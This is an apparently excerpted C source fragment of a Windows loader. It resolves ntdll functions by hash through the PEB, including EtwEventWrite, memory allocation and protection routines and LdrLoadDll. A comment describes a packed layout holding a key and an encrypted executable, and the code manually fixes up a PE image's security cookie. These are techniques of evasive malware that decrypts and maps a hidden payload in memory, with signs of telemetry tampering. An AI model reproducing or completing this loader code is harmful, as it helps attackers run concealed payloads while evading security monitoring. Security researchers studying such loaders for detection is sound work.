...
DEC_FUNC BOOL GetFuncs(
    ...
    for (;  (addr < ade) && lft;  addr++, ordd++) {
        LPCSTR cur = (LPCSTR)((PBYTE)hmd + *addr);
        DWORD  hs  = HashStr(cur);
...
DEC_FUNC BOOL InitPEBApi(HMODULE *phNt, const MN_PEB *peb) {
    *phNt      = GetLibAddr(peb);
    ...
    FUNC_ENTRY fey[] = {
        { HASH_EtwEventWrite,             &pNtEtwEventWrite           },
        { HASH_NtAllocateVirtualMemory,   &pNtAllocateVirtualMemory   },
        { HASH_NtFreeVirtualMemory,       &pNtFreeVirtualMemory       },
        { HASH_NtProtectVirtualMemory,    &pNtProtectVirtualMemory    },
        { HASH_LdrLoadDll,                &pLdrLoadDll                },
        { HASH_LdrGetProcedureAddress,    &pLdrGetProcedureAddress    },
        { HASH_RtlAddFunctionTable,       &pRtlAddFunctionTable       },
        { HASH_NtQueryInformationProcess, &pNtQueryInformationProcess },
        { HASH_NtSetInformationProcess,   &pNtSetInformationProcess   },
        { HASH_NtSetInformationThread,    &pNtSetInformationThread    },
        { HASH_NtOpenFile,                &pNtOpenFile                },
        { HASH_NtReadFile,                &pNtReadFile                },
        { HASH_NtClose,                   &pNtClose                   },
        { HASH_NtQueryInformationFile,    &pNtQueryInformationFile    },
        { HASH_NtTerminateProcess,        &pNtTerminateProcess        }
...
// [UINT32=total_len:4|BYTE=key_size:1|LPCBYTE=key:key_size|UINT32=raw_len:4|LPCBYTE=encrypted_exe]
    ...
    if (lcd->Size && lcd->VirtualAddress) {
        ...
        if (lc->SecurityCookie) {
            ULONG_PTR    cadr = lc->SecurityCookie + (UINT64)img - nthd->OptionalHeader.ImageBase;
            *(ULONG_PTR*)cadr = (ULONG_PTR)img ^ *(volatile ULONG_PTR*)KUSER_INTERRUPT_TIME_VA;
        }
    }}
